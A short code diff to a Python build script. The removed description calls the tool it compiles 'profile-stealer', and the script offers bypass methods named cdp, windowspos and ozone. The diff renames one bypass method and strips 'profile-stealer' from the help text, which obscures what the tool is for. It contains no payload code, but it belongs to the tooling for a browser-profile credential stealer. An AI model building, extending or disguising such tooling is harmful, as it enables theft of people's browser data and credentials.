@@ -19,7 +19,7 @@ from pathlib import Path
 METHODS = {
     "bypass": {
         "cdp": "methods/bypass_methods/cdp.hpp",
-        "windowpos": "methods/bypass_methods/windowpos.hpp",
+        "windowspos": "methods/bypass_methods/windowspos.hpp",
         "ozone": "methods/bypass_methods/ozone.hpp",
     },
     "launcher": {
@@ -280,7 +280,7 @@ def parse_args() -> argparse.Namespace:
         default_sleep = "generic_windows"
     print(f"[*] Detected OS: {platform.system()} – only native methods available")
     parser = argparse.ArgumentParser(
-        description="Builds and compiles profile-stealer with the selected runtime options"
+        description="Builds and compiles with the selected runtime options"
     )
     parser.add_argument(
         "-T",
@@ -306,7 +306,7 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument(
         "-B",
         "--bypass-method",
-        choices=["cdp", "windowpos", "ozone"],
+        choices=["cdp", "windowspos", "ozone"],
         default="cdp",
         help="Bypass method to use (default: %(default)s)",
     )
